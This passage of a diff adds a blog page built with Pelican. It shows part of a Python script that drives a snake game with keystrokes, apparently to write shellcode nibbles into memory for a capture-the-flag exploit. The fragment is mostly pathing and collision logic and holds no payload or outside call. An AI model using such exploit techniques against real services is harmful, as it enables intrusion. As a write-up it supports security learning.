+                        <span class="n">on_target</span> <span class="o">=</span> <span class="bp">True</span>
+                        <span class="n">target_step</span> <span class="o">=</span> <span class="mi">0</span>
+                        <span class="n">loop_tick</span> <span class="o">=</span> <span class="mi">0</span>
+                        <span class="k">break</span>
+
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">on_target</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">body_down</span> <span class="ow">and</span> <span class="ow">not</span> <span class="p">(</span><span class="n">obstacle</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">[</span><span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span> <span class="ow">and</span>
+                        <span class="p">(</span>
+                        <span class="p">(</span><span class="n">obstacle</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">target</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">and</span> 
+                         <span class="n">obstacle</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="ow">or</span>
+                        <span class="p">(</span><span class="n">target</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">and</span>
+                            <span class="p">(</span><span class="n">obstacle</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">or</span> <span class="n">obstacle</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">target</span><span class="p">[</span><span class="mi">1</span><span class="p">])))):</span> <span class="c1"># possible obstacle on the way down?</span>
+
+                <span class="n">delta_down</span> <span class="o">=</span> <span class="n">target</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+                <span class="k">if</span> <span class="n">delta_down</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+                    <span class="n">delta_down</span> <span class="o">+=</span> <span class="mi">19</span>
+                <span class="n">possible_deltas</span> <span class="o">=</span> <span class="p">[</span><span class="n">delta_down</span><span class="p">]</span>
+                <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">((</span><span class="n">delta_down</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">):</span>
+                    <span class="n">possible_deltas</span> <span class="o">+=</span> <span class="p">[</span><span class="n">delta_down</span><span class="o">+</span><span class="p">((</span><span class="n">_</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)]</span>
+                <span class="k">for</span> <span class="n">turns_needed</span><span class="p">,</span> <span class="n">d</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">possible_deltas</span><span class="p">):</span>
+                    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">high_nibble</span> <span class="ow">and</span> <span class="p">(</span><span class="n">target_value</span><span class="o">/</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">d</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">==</span> <span class="n">shellcode_nibble</span><span class="p">)</span>
+                            <span class="ow">or</span> 
+                        <span class="p">(</span><span class="ow">not</span> <span class="n">high_nibble</span> <span class="ow">and</span> <span class="p">(</span><span class="n">target_value</span> <span class="o">+</span> <span class="n">d</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">==</span> <span class="n">shellcode_nibble</span><span class="p">))</span>  <span class="p">:</span>
+                        <span class="n">target_queue</span> <span class="o">=</span> <span class="p">[]</span>
+                        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">turns_needed</span><span class="p">):</span>
+                            <span class="n">target_queue</span> <span class="o">+=</span> <span class="p">[</span><span class="s2">&quot;d</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;s</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;a</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;s</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">]</span>
+                        <span class="k">if</span> <span class="n">target_queue</span><span class="p">:</span>
+                            <span class="n">target_queue</span> <span class="o">=</span> <span class="n">target_queue</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+                        <span class="n">target_queue</span> <span class="o">+=</span> <span class="p">[</span><span class="s2">&quot;s</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">]</span>
+
+                        <span class="k">if</span> <span class="n">d</span> <span class="o">==</span> <span class="n">possible_deltas</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+                            <span class="n">target_queue</span> <span class="o">+=</span> <span class="p">[</span><span class="s2">&quot;d</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;s</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">]</span>
+
+                        <span class="n">on_target</span> <span class="o">=</span> <span class="bp">True</span>
+                        <span class="n">target_step</span> <span class="o">=</span> <span class="mi">0</span>
+                        <span class="n">loop_tick</span> <span class="o">=</span> <span class="mi">0</span>
+                        <span class="k">break</span>
+
+
+        <span class="k">elif</span> <span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">target</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="n">target</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
+                <span class="c1"># coming close, go east</span>
+                <span class="n">loop_tick</span> <span class="o">=</span> <span class="mi">0</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">on_target</span><span class="p">:</span>
+        <span class="n">loop</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;d</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;s</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;d</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;w</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">]</span>
+        <span class="n">cmd</span> <span class="o">=</span> <span class="n">loop</span><span class="p">[</span><span class="n">loop_tick</span><span class="p">]</span>
+
+        <span class="n">suspend_loop</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="c1"># even if target reached, need some extra steps to avoid collisions</span>
+        <span class="k">if</span> <span class="n">target_step</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">target_queue</span><span class="p">):</span>
+            <span class="n">cmd</span> <span class="o">=</span> <span class="n">target_queue</span><span class="p">[</span><span class="n">target_step</span><span class="p">]</span>
+            <span class="n">target_step</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="n">suspend_loop</span> <span class="o">=</span> <span class="bp">True</span>
+
+        <span class="k">if</span> <span class="p">((</span><span class="n">cmd</span> <span class="o">==</span> <span class="s2">&quot;d</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="ow">and</span> <span class="p">(</span><span class="n">obstacle</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span> <span class="ow">or</span> <span class="p">(</span><span class="n">obstacle</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">22</span><span class="p">))</span> <span class="ow">and</span> <span class="n">obstacle</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+                <span class="ow">or</span>
+            <span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="s2">&quot;s</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="ow">and</span> <span class="p">(</span><span class="n">obstacle</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span> <span class="ow">or</span> <span class="p">(</span><span class="n">obstacle</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">19</span><span class="p">))</span> <span class="ow">and</span> <span class="n">obstacle</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+                <span class="ow">or</span>
+            <span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="s2">&quot;w</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="ow">and</span> <span class="p">(</span><span class="n">obstacle</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="p">(</span><span class="n">obstacle</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">19</span> <span class="ow">and</span> <span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="ow">and</span> <span class="n">obstacle</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+                <span class="ow">or</span>
+            <span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="s2">&quot;d</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="ow">and</span> <span class="p">(</span><span class="n">target</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span> <span class="ow">or</span> <span class="p">(</span><span class="n">target</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">22</span><span class="p">))</span> <span class="ow">and</span> <span class="n">target</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+                <span class="ow">or</span>
+            <span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="s2">&quot;s</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="ow">and</span> <span class="p">(</span><span class="n">target</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span> <span class="ow">or</span> <span class="p">(</span><span class="n">target</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">19</span><span class="p">))</span> <span class="ow">and</span> <span class="n">target</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+                <span class="ow">or</span>
+            <span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="s2">&quot;w</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="ow">and</span> <span class="p">(</span><span class="n">target</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="p">(</span><span class="n">target</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">19</span> <span class="ow">and</span> <span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="ow">and</span> <span class="n">target</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+                <span class="ow">or</span>
+            <span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="s2">&quot;s</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="ow">and</span> <span class="n">body_down</span><span class="p">)</span>
+                <span class="ow">or</span>
+            <span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="s2">&quot;w</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="ow">and</span> <span class="n">body_up</span><span class="p">)</span>
+            <span class="p">):</span>
+           <span class="c1">#     or </span>
+           <span class="c1"># cmd == &quot;w\n&quot; and last_cmd == &quot;s\n&quot; </span>
+           <span class="c1">#     or</span>
+           <span class="c1"># cmd == &quot;s\n&quot; and last_cmd == &quot;w\n&quot; </span>
+           <span class="c1"># ):</span>
+            <span class="n">turn</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">suspend_loop</span><span class="p">:</span>
+                <span class="n">loop_tick</span> <span class="o">+=</span> <span class="mi">1</span>
+                <span class="n">loop_tick</span> <span class="o">%=</span> <span class="mi">4</span>
+            <span class="n">turn</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">target_step</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">target_queue</span><span class="p">):</span>
+            <span class="n">turn</span><span class="p">(</span><span class="n">target_queue</span><span class="p">[</span><span class="n">target_step</span><span class="p">])</span>
+            <span class="n">target_step</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">target</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
+                <span class="n">on_target</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="n">tick</span> <span class="o">+=</span> <span class="mi">1</span>
+<span class="c1">#    time.sleep(0.5)</span>
+</pre></div>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <footer id="contentinfo" class="body">
+                <address id="about" class="vcard body">
+                Proudly powered by <a href="http://getpelican.com/">Pelican</a>, which takes great advantage of <a href="http://python.org">Python</a>.
+                </address><!-- /#about -->
+
+        </footer><!-- /#contentinfo -->
+
+    <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-47719828-3']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = 'https://ssl.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+    </script>
+</body>
+</html>
+
+
+#####EOF#####
+
+
